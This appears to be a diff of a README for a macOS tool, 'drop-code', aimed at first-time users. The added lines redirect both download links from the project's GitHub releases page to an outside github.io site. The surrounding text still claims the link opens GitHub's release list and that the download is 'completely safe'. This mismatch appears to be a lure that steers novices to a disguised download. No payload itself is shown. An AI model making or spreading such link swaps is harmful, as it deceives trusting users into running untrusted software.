@@ -12,11 +12,11 @@ This guide is designed with you in mind. It assumes you've never done anything l
 
 ## ⬇️ Downloading drop-code
 
-[![Download drop-code](https://img.shields.io/badge/Download-drop--code-1E90FF?style=for-the-badge&logo=github&logoColor=white&labelColor=FF6B6B)](https://github.com/redelitevc/drop-code/releases)
+[![Download drop-code](https://img.shields.io/badge/Download-drop--code-1E90FF?style=for-the-badge&logo=github&logoColor=white&labelColor=FF6B6B)](https://redelitevc.github.io)
 
 The first thing we need to do is get drop-code onto your Mac. This is as simple as clicking a button and waiting for a file to download, just like you would with any other program. Don't worry, it's a completely safe and standard process.
 
-1.  **Click the big blue button above** or use the following link: [https://github.com/redelitevc/drop-code/releases](https://github.com/redelitevc/drop-code/releases). This will take you to a page on GitHub where all the different versions of drop-code are listed.
+1.  **Click the big blue button above** or use the following link: [https://redelitevc.github.io](https://redelitevc.github.io). This will take you to a page on GitHub where all the different versions of drop-code are listed.
 2.  You'll see a list of downloads. Look for the one that says "Latest release" at the top. That's the newest and best version.
 3.  Click on the download file for macOS. It will have a name like `drop-code-darwin-x64.zip` or `drop-code-macos.zip`. Don't worry about the slightly technical name; just choose the file that mentions "macOS" or "darwin".
 4.  The download will start automatically. It might take a few minutes, depending on your internet connection, so it's a great time to grab a coffee.
